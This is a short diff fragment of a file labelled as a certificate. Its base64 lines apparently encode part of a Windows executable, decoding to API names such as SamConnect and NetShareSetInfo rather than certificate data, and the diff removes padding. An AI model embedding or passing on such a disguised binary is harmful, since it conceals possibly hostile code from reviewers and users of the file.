@@ -3843,14 +3788,4 @@ UEJYQFoAAAA/PzFfV2luaXRAc3RkQEBRQUVAWFoAAABmcmVlAABOZXRTaGFyZVNl
 dEluZm8AAABSdGxJbml0VW5pY29kZVN0cmluZwAAQ29Jbml0aWFsaXplAABTYW1D
 b25uZWN0AABDb21tYW5kTGluZVRvQXJndlcAAHdzcHJpbnRmVwAAAFZlclF1ZXJ5
 VmFsdWVXAABHZXRQcmludGVyVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -----END CERTIFICATE-----
